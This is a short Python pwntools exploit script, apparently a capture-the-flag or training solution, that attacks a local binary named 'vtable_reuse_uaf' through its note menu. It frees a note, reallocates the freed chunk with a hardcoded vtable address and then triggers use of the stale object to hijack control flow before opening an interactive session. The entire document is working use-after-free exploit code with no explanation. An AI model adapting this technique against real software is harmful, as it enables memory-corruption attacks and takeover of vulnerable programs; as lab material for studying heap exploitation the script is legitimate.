#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
context.log_level = "debug"
r = process('./vtable_reuse_uaf')


def usenote():
    r.recvuntil("4. exit\n")
    r.sendline("1")

def afternote(_len,_data):
    r.recvuntil("4. exit\n")
    r.sendline("2")
    r.recvuntil("len:")
    r.sendline(_len)
    r.recvuntil("data:")
    r.sendline(_data)

def freenote():
    r.recvuntil("4. exit\n")
    r.sendline("3")



# plz set the vul vtable addr
vtable_add =0x401b10

freenote()
afternote("48",p64(vtable_add))
usenote()

r.interactive()
